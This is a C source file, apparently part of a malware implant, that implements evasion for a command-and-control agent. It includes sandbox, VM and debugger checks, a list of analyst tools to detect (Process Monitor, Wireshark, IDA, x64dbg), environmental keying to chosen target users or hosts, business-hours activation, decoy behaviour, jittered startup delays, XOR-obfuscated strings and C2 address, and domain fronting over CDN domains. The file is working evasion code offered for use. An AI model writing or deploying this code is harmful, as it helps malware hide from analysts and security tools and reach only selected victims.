/*
 * Advanced Evasion Techniques
 * Anti-analysis, anti-sandbox, and stealth functionality
 */

#include "evasion.h"
#include "utils.h"
#include "config.h"

// XOR key for string obfuscation (changes per build)
static uint8_t xor_key[16] = {
    0x4A, 0x7F, 0x9E, 0x2B, 0xC3, 0x15, 0x68, 0xD1,
    0x3F, 0x8A, 0x51, 0xB7, 0x2D, 0xF4, 0x6C, 0x9B
};

// String decryption (evasion version)
void decrypt_string_evasion(char* str, size_t len) {
    for (size_t i = 0; i < len; i++) {
        str[i] ^= xor_key[i % 16];
    }
}

// Generate random delay with jitter
uint32_t random_delay(uint32_t min_ms, uint32_t max_ms) {
    uint32_t range = max_ms - min_ms;
    uint32_t rand_val = get_random_int() % range;
    return min_ms + rand_val;
}

// Sleep with random jitter
void jittered_sleep(uint32_t base_ms, uint32_t jitter_ms) {
    uint32_t actual_delay = random_delay(
        base_ms - jitter_ms,
        base_ms + jitter_ms
    );
    sleep_ms(actual_delay);
}

// Check if running too fast (sandbox acceleration)
int detect_time_acceleration(void) {
    uint32_t start = get_tick_count();
    sleep_ms(1000);  // Sleep for 1 second
    uint32_t elapsed = get_tick_count() - start;
    
    // If less than 900ms elapsed, time is accelerated
    if (elapsed < 900) {
        return 1;  // Sandbox detected
    }
    return 0;
}

// Check system uptime (sandboxes usually have low uptime)
int check_system_uptime(void) {
    uint32_t uptime = get_system_uptime();
    
    // If uptime < 10 minutes, probably sandbox
    if (uptime < 600000) {  // 10 minutes in ms
        return 1;  // Suspicious
    }
    return 0;
}

// Check for recent user activity (mouse movement, keyboard)
int check_user_activity(void) {
#ifdef PLATFORM_WINDOWS
    LASTINPUTINFO lii = {0};
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD idle_time = GetTickCount() - lii.dwTime;
        // If idle > 5 minutes, suspicious (user should be active)
        if (idle_time > 300000) {
            return 1;  // No real user
        }
    }
#endif
    return 0;
}

// Check for minimum number of processes
int check_process_count(void) {
    int count = count_running_processes();
    
    // Real systems have 50+ processes
    // Sandboxes often have < 30
    if (count < 30) {
        return 1;  // Sandbox likely
    }
    return 0;
}

// Check for internet connectivity (to legitimate sites)
int check_internet_connectivity(void) {
    // Try to resolve well-known domains
    const char* test_domains[] = {
        "www.google.com",
        "www.microsoft.com",
        "www.amazon.com",
        NULL
    };
    
    for (int i = 0; test_domains[i]; i++) {
        if (resolve_hostname(test_domains[i]) != NULL) {
            return 1;  // Internet available
        }
    }
    
    return 0;  // No internet or DNS blocked
}

// Check if running during business hours (more realistic)
int is_business_hours(void) {
    system_time_t st;
    get_local_time(&st);
    
    // Monday-Friday, 9 AM - 5 PM
    if (st.day_of_week >= 1 && st.day_of_week <= 5) {
        if (st.hour >= 9 && st.hour < 17) {
            return 1;
        }
    }
    return 0;
}

// Environmental keying: Check if this is the target system
int validate_environment(const char* target_username, 
                         const char* target_domain,
                         const char* target_hostname) {
    char username[256] = {0};
    char hostname[256] = {0};
    char domain[256] = {0};
    
    get_username(username, sizeof(username));
    get_hostname(hostname, sizeof(hostname));
    get_domain(domain, sizeof(domain));
    
    // Check if any identifiers match
    int matches = 0;
    
    if (target_username && str_cmp(username, target_username) == 0) {
        matches++;
    }
    if (target_hostname && str_cmp(hostname, target_hostname) == 0) {
        matches++;
    }
    if (target_domain && str_cmp(domain, target_domain) == 0) {
        matches++;
    }
    
    // Require at least one match if keying enabled
    return matches > 0;
}

// Perform "legitimate" behavior before connecting
void perform_decoy_behavior(void) {
    // 1. Check for updates (to legitimate Microsoft domain)
    jittered_sleep(2000, 500);
    check_internet_connectivity();
    
    // 2. Read some registry keys (normal behavior)
    jittered_sleep(1000, 300);
    #ifdef PLATFORM_WINDOWS
    read_registry_string(HKEY_LOCAL_MACHINE, 
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                        "ProgramFilesDir");
    #endif
    
    // 3. Check system information
    jittered_sleep(1500, 400);
    get_system_info_basic();
    
    // 4. Create temp file (normal software behavior)
    jittered_sleep(800, 200);
    // (Don't actually write, just check if we can)
    
    // Total delay: ~5-7 seconds of "normal" activity
}

// Comprehensive pre-execution checks
int should_execute(void) {
    // Anti-analysis checks
    if (detect_debugger()) {
        return 0;  // Debugger present
    }
    
    if (detect_vm()) {
        return 0;  // Running in VM
    }
    
    if (detect_sandbox()) {
        return 0;  // Sandbox detected
    }
    
    // Advanced checks
    if (detect_time_acceleration()) {
        return 0;  // Time is being accelerated
    }
    
    if (check_system_uptime()) {
        return 0;  // System too new
    }
    
    if (check_process_count()) {
        return 0;  // Too few processes
    }
    
    if (check_user_activity()) {
        return 0;  // No real user
    }
    
    // Environmental keying (example - customize per target)
    #ifdef ENABLE_ENV_KEYING
    if (!validate_environment(TARGET_USERNAME, TARGET_DOMAIN, TARGET_HOSTNAME)) {
        return 0;  // Not the target system
    }
    #endif
    
    // Time-based activation (example - only run during business hours)
    #ifdef ENABLE_TIME_ACTIVATION
    if (!is_business_hours()) {
        return 0;  // Outside business hours
    }
    #endif
    
    // All checks passed
    return 1;
}

// Delayed startup with realistic behavior
void stealthy_startup(void) {
    // 1. Initial delay (looks like app initialization)
    uint32_t initial_delay = random_delay(30000, 90000);  // 30-90 seconds
    sleep_ms(initial_delay);
    
    // 2. Perform legitimate-looking behavior
    perform_decoy_behavior();
    
    // 3. Additional random delay
    jittered_sleep(5000, 2000);  // 3-7 seconds
    
    // 4. Check if internet is available
    if (!check_internet_connectivity()) {
        // No internet, wait longer
        jittered_sleep(60000, 30000);  // 30-90 seconds more
    }
    
    // Total startup delay: 70-200+ seconds
    // This is realistic for real applications
}

// Obfuscate C2 address (XOR encryption at runtime)
void deobfuscate_c2_address(char* output, size_t max_len) {
    // Encrypted C2 address (must be generated at build time)
    // Example: "127.0.0.1" XOR'd with key
    uint8_t encrypted_host[] = {
        0x6D, 0x5F, 0xF3, 0x7E, 0x95, 0x7C, 0x0B, 0xA0, 0x0E, 0x00
    };
    
    size_t len = sizeof(encrypted_host);
    if (len >= max_len) len = max_len - 1;
    
    // Decrypt
    for (size_t i = 0; i < len; i++) {
        output[i] = encrypted_host[i] ^ xor_key[i % 16];
    }
    output[len] = '\0';
}

// Smart retry logic implementation
uint32_t calculate_retry_delay(retry_config_t* config) {
    // Exponential backoff: delay = base * 2^attempt
    uint32_t delay = config->base_delay * (1 << config->attempt);
    
    // Cap at max delay
    if (delay > config->max_delay) {
        delay = config->max_delay;
    }
    
    // Add jitter (±25%)
    uint32_t jitter = delay / 4;
    delay = random_delay(delay - jitter, delay + jitter);
    
    config->attempt++;
    return delay;
}

// Domain fronting: Use legitimate-looking domains
void get_fronted_domain(char* output, size_t max_len) {
    // Use CDN domains that look legitimate
    const char* cdn_domains[] = {
        "cdn.cloudflare.com",
        "a248.e.akamai.net",
        "d1.awsstatic.com",
        "azureedge.net",
        NULL
    };
    
    int idx = get_random_int() % 4;
    str_cpy(output, cdn_domains[idx], max_len);
}

// Check for analysis tools running
int detect_analysis_tools(void) {
#ifdef PLATFORM_WINDOWS
    const char* analysis_tools[] = {
        "procmon.exe",      // Process Monitor
        "procmon64.exe",
        "procexp.exe",      // Process Explorer
        "procexp64.exe",
        "wireshark.exe",    // Wireshark
        "fiddler.exe",      // Fiddler
        "tcpview.exe",      // TCPView
        "autoruns.exe",     // Autoruns
        "idaq.exe",         // IDA Pro
        "idaq64.exe",
        "x64dbg.exe",       // x64dbg
        "x32dbg.exe",
        "ollydbg.exe",      // OllyDbg
        "windbg.exe",       // WinDbg
        NULL
    };
    
    for (int i = 0; analysis_tools[i]; i++) {
        if (find_process_by_name(analysis_tools[i])) {
            return 1;  // Analysis tool detected
        }
    }
#endif
    return 0;
}

// Polymorphic sleep (changes behavior each time)
void polymorphic_sleep(uint32_t target_ms) {
    // Randomly choose sleep strategy
    int strategy = get_random_int() % 3;
    
    switch (strategy) {
        case 0:
            // Single sleep
            sleep_ms(target_ms);
            break;
            
        case 1:
            // Multiple small sleeps
            {
                int chunks = 5 + (get_random_int() % 5);  // 5-10 chunks
                uint32_t chunk_size = target_ms / chunks;
                for (int i = 0; i < chunks; i++) {
                    sleep_ms(chunk_size);
                }
            }
            break;
            
        case 2:
            // Sleep with busy-wait intermixed
            {
                uint32_t sleep_time = target_ms * 3 / 4;
                uint32_t busy_time = target_ms / 4;
                sleep_ms(sleep_time);
                
                // Busy wait
                uint32_t start = get_tick_count();
                while ((get_tick_count() - start) < busy_time) {
                    // Spin
                }
            }
            break;
    }
}
